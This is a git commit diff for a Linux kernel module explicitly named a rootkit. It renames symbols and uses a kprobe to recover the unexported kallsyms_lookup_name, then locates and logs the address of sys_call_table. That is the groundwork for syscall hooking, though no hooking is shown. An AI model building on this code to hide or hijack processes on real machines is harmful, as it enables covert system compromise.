1d08b57c879f1c8e48ccf2cf00caef926ddc7e52
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-04-25 18:40:50 +0300

    Module name prefix for all symbols

--- rootkit.c
+++ rootkit.c
@@ -11,18 +11,18 @@ MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
 
-unsigned long locate_kallsyms_lookup_name(void);
-unsigned long *locate_syscall_table(void);
+unsigned long rooti_locate_kallsyms_lookup_name(void);
+unsigned long *rooti_locate_syscall_table(void);
 
-unsigned long (*ksyms_lookup_name)(const char *name) = NULL;
-unsigned long *syscall_table = NULL;
+static unsigned long (*rooti_kallsyms_lookup_name)(const char *name) = NULL;
+static unsigned long *rooti_syscall_table = NULL;
 
 /* 
     Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported.
     We can work around this by probing the kallsyms_lookup_name() with functions from kprobes.h
     One of the things that probing a function gives us is its memory address
 */
-unsigned long locate_kallsyms_lookup_name(void)
+unsigned long rooti_locate_kallsyms_lookup_name(void)
 {
     struct kprobe kp;
     unsigned long addr;
@@ -44,44 +44,49 @@ unsigned long locate_kallsyms_lookup_name(void)
     Looks up the address of the kernel syscall table.
     Returns a pointer to the table if found, otherwise returns NULL.
 */
-unsigned long *locate_syscall_table(void)
+unsigned long *rooti_locate_syscall_table(void)
 {
-    unsigned long addr = ksyms_lookup_name("sys_call_table");
-    if (addr == 0) {
-        return NULL;
-    }
-    return (unsigned long *)addr;
+    unsigned long *syscall_table;
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
+    syscall_table = (unsigned long *)rooti_kallsyms_lookup_name("sys_call_table");
+#endif
+
+    return syscall_table;
 }
 
 
-// LKM initialization
-static int __init mod_init(void)
+/* LKM initialization */
+static int __init rooti_init(void)
 {
     printk(KERN_INFO "rootkit: init\n");
 
     // Locate 
-    unsigned long kln_addr = locate_kallsyms_lookup_name();
+    unsigned long kln_addr = rooti_locate_kallsyms_lookup_name();
     if (kln_addr == 0) {
         printk(KERN_ERR "Failed to locate kallsyms_lookup_name :(\n");
         return 1;
     }
-    ksyms_lookup_name = (unsigned long (*)(const char *name))kln_addr;
+    rooti_kallsyms_lookup_name = (unsigned long (*)(const char *name))kln_addr;
 
     // Locate the syscall table
-    syscall_table = locate_syscall_table();
-    if (syscall_table == NULL) {
+    rooti_syscall_table = (unsigned long *)rooti_kallsyms_lookup_name("sys_call_table");
+    if (rooti_syscall_table == NULL) {
         printk(KERN_ERR "Failed to locate sys_call_table :(\n");
         return 1;
     }
 
+    printk(KERN_DEBUG "The address of the syscall table is: %lu\n", (unsigned long)rooti_syscall_table);
+
     return 0;
 }
 
-// LKM cleanup
-static void __exit mod_exit(void)
+
+/* LKM initialization */
+static void __exit rooti_exit(void)
 {
     printk(KERN_INFO "rootkit: exit\n");
 }
 
-module_init(mod_init);
-module_exit(mod_exit);
+module_init(rooti_init);
+module_exit(rooti_exit);
